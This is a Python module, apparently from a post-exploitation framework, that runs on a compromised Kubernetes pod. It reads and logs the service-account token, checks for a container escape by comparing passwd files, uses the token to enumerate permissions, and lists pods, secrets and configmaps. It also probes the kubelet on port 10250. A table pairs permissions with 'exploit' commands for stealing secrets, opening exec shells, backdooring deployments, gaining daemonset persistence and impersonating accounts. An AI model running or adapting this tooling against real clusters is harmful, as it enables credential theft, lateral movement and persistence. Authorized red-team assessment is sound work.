import json

# External library imports
from loguru import logger

# Local application/library specific imports
from .core.action import BaseAction
from ..utils.jwt import TokenReader


class KubeCheckAction(BaseAction):
    DESCRIPTION = (
        "Check for Kubernetes environment and enumerate basic pod-level access."
    )

    def run(self) -> str:
        logger.info("☁️ Kubernetes Environment Check")

        token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        cert_path = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
        namespace_path = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"

        token = self._executor.remote_execute(f"cat {token_path}").strip()
        if not token:
            logger.warning("⚠️ No Kubernetes token found — likely not in a pod.")
            return

        logger.success(f"🔐 Found Kubernetes token: {token}")

        try:
            reader = TokenReader(token)
            api_server = reader.iss
            subject = reader.sub
            logger.info(f"👤 Authenticated as: {subject}")
            logger.info(f"🌍 Kubernetes API server: {api_server}")
        except Exception as exc:
            logger.error(f"❌ Failed to parse the Kubernetes token: {exc}")
            return

        # CA certificate check
        if not self._executor.remote_execute(f"cat {cert_path}"):
            logger.warning("⚠️ No Kubernetes CA certificate found.")
            return
        logger.success(f"📜 Kubernetes CA certificate found: {cert_path}")

        # Check if we are inside a container
        cgroup_info = self._executor.remote_execute("cat /proc/1/cgroup").strip()
        logger.info(f"🔍 Cgroup info: {cgroup_info}")

        if cgroup_info.strip() == "0::/":
            logger.info("🖥️ Likely running on host (not containerized).")
        else:
            if "kubepods" in cgroup_info:
                logger.info("📦 Inside a Kubernetes pod.")
            else:
                logger.info("🔍 Uncertain container context.")

            # Step 4: Attempt chroot escape detection
            etc_passwd = self._executor.remote_execute("cat /etc/passwd").strip()
            root_etc_passwd = self._executor.remote_execute(
                "cat /proc/1/root/etc/passwd"
            ).strip()

            if etc_passwd != root_etc_passwd:
                logger.success(
                    "🚪 Detected chroot escape possible — /proc/1/root/etc/passwd differs from guest."
                )
            else:
                logger.info(
                    "🔐 Same /etc/passwd inside and outside — likely no escape or already on host."
                )

        # Base curl command
        curl_base = f"curl -sS --cacert {cert_path} -H 'Authorization: Bearer {token}'"

        namespace = (
            self._executor.remote_execute(f"cat {namespace_path}").strip() or "default"
        )
        logger.info(f"📛 Using namespace: {namespace}")

        # SelfSubjectRulesReview (check what we can do)
        logger.info("🔎 Enumerating allowed actions using SelfSubjectRulesReview (SSR)")
        ssrr_payload = json.dumps({"spec": {"namespace": namespace}})
        ssrr_cmd = (
            f"{curl_base} -H 'Content-Type: application/json' "
            f"-X POST -d '{ssrr_payload}' "
            f"{api_server}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
        )
        ssrr_raw = self._executor.remote_execute(ssrr_cmd, timeout=10)
        try:
            ssrr_json = json.loads(ssrr_raw)
            verbs = {
                r["resources"][0]: r["verbs"]
                for r in ssrr_json.get("status", {}).get("resourceRules", [])
                if r.get("resources")
            }
        except Exception:
            logger.warning("⚠️ Could not parse SelfSubjectRulesReview.")
            verbs = {}

        self._analyze_rules(ssrr_json)

        # Try to list pods
        logger.info("📡 Trying to list pods via API")
        pods_cmd = f"{curl_base} {api_server}/api/v1/pods"
        pods_raw = self._executor.remote_execute(pods_cmd, timeout=10)
        try:
            pods_json = json.loads(pods_raw)

            kind = pods_json.get("kind", "")

            if kind == "Status":
                status = pods_json.get("status", "")
                logger.info(f"Listing pods: '{status}' ({pods_json.get('reason')})")

            elif kind == "PodList":
                logger.success("✅ Successfully listed pods.")

            else:
                logger.warning("⚠️ Got response, but not PodList.")
        except Exception:
            logger.warning("🚫 Forbidden or no pods returned.")

        # If we can't list pods, try Secrets, ConfigMaps, etc.
        for resource in ["secrets", "configmaps", "serviceaccounts"]:
            if verbs.get(resource) and "list" in verbs[resource]:
                logger.info(f"🔐 Trying to list {resource}")
                list_cmd = (
                    f"{curl_base} {api_server}/api/v1/namespaces/default/{resource}"
                )
                output = self._executor.remote_execute(list_cmd)
                try:
                    parsed = json.loads(output)
                    logger.success(f"📦 Retrieved {resource}")
                    print(json.dumps(parsed, indent=4))
                except Exception:
                    logger.warning(f"⚠️ Failed to parse {resource} list response.")

        logger.info("📞 Probing kubelet (port 10250)")
        node_ip = self._executor.remote_execute(
            "ip route get 1 | awk '{print $NF; exit}'"
        ).strip()

        if node_ip:
            kubelet_cmd = f"curl -sk https://{node_ip}:10250/pods"
            result = self._executor.remote_execute(kubelet_cmd, timeout=5)
            if result:
                logger.success(f"📡 Kubelet at {node_ip}:10250 responded.")
                try:
                    print(json.dumps(json.loads(result), indent=4))
                except Exception:
                    print(result)
            else:
                logger.warning("🚫 No response from kubelet.")

    def _analyze_rules(self, ssrr_json: dict) -> None:
        """
        Analyze SSR response and suggest actions based on privileges.
        """
        logger.info("🧠 Analyzing allowed actions")

        resource_suggestions = {
            "secrets": {
                "desc": "🕵️ Read Kubernetes secrets (may include service credentials or keys)",
                "exploit": "curl .../api/v1/namespaces/{ns}/secrets",
            },
            "pods/exec": {
                "desc": "🐚 Execute commands inside existing pods (Remote Code Execution)",
                "exploit": (
                    "kubectl exec -n {ns} <pod-name> -- /bin/sh  # Or /bin/bash\n"
                    "API: POST to /api/v1/namespaces/{ns}/pods/<pod-name>/exec?"
                    "container=<container>&command=sh&stdin=true&stderr=true&stdout=true&tty=true"
                ),
            },
            "pods/portforward": {
                "desc": "📡 Forward pod ports to local machine (access internal services)",
                "exploit": "kubectl port-forward pod-name 8080:80",
            },
            "services": {
                "desc": "📡 Discover internal services (enumeration or SSRF entrypoints)",
                "exploit": "curl .../api/v1/namespaces/{ns}/services",
            },
            "configmaps": {
                "desc": "📝 Read app configs, often contain credentials",
                "exploit": "curl .../api/v1/namespaces/{ns}/configmaps",
            },
            "roles": {
                "desc": "🧱 Review local Role definitions for privilege escalation",
                "exploit": "curl .../apis/rbac.authorization.k8s.io/v1/namespaces/{ns}/roles",
            },
            "clusterroles": {
                "desc": "🔐 Review global ClusterRoles (e.g. cluster-admin)",
                "exploit": "curl .../apis/rbac.authorization.k8s.io/v1/clusterroles",
            },
            "rolebindings": {
                "desc": "🔗 Check who is bound to which Roles (local scope)",
                "exploit": "curl .../apis/rbac.authorization.k8s.io/v1/namespaces/{ns}/rolebindings",
            },
            "clusterrolebindings": {
                "desc": "🔗 Discover global bindings (detect cluster-admin bindings)",
                "exploit": "curl .../apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
            },
            "pods": {
                "desc": "📦 Enumerate pods (for lateral movement)",
                "exploit": "curl .../api/v1/namespaces/{ns}/pods",
            },
            "deployments": {
                "desc": "📦 Redeploy pods with custom container/image (backdoor)",
                "exploit": "kubectl patch deployment ... or curl patch API",
            },
            "daemonsets": {
                "desc": "📡 Achieve node-wide persistence (like rootkit)",
                "exploit": "kubectl create daemonset ... or patch existing one",
            },
            "serviceaccounts": {
                "desc": "👤 Discover other service accounts (steal/mount tokens)",
                "exploit": "curl .../api/v1/namespaces/{ns}/serviceaccounts",
            },
            "nodes": {
                "desc": "🖥 Node info (maybe access /meta-data if in cloud)",
                "exploit": "curl .../api/v1/nodes",
            },
        }

        rules = ssrr_json.get("status", {}).get("resourceRules", [])
        matched_resources = set()

        for rule in rules:
            resources = rule.get("resources", [])
            verbs = rule.get("verbs", [])
            api_groups = rule.get("apiGroups", [])

            for res in resources:
                suggestion = resource_suggestions.get(res)
                if suggestion:
                    matched_resources.add(res)
                    desc = suggestion["desc"]
                    exploit = suggestion["exploit"]
                    verbs_str = ", ".join(verbs)
                    logger.info(f"🔎 {res} — Verbs: [{verbs_str}] → {desc}")
                    logger.info(f"    🧪 Try: {exploit}")

        # Impersonation
        for rule in rules:
            if "impersonate" in rule.get("verbs", []):
                logger.warning(
                    "🧙 Impersonation allowed — you can impersonate other users or serviceaccounts."
                )
                logger.info("    🧪 Try: kubectl auth can-i --as system:admin '*' '*'")

        # Detect self-introspection only
        introspection_only = len(rules) == 2 and all(
            set(r.get("resources", []))
            <= {
                "selfsubjectaccessreviews",
                "selfsubjectrulesreviews",
                "selfsubjectreviews",
            }
            for r in rules
        )

        if not matched_resources and introspection_only:
            logger.warning("🔐 This service account can only introspect itself.")

        if not matched_resources and not introspection_only:
            logger.warning("🔒 No actionable permissions detected.")
            logger.info(
                "🧪 Consider probing unauthenticated endpoints or kubelet APIs."
            )
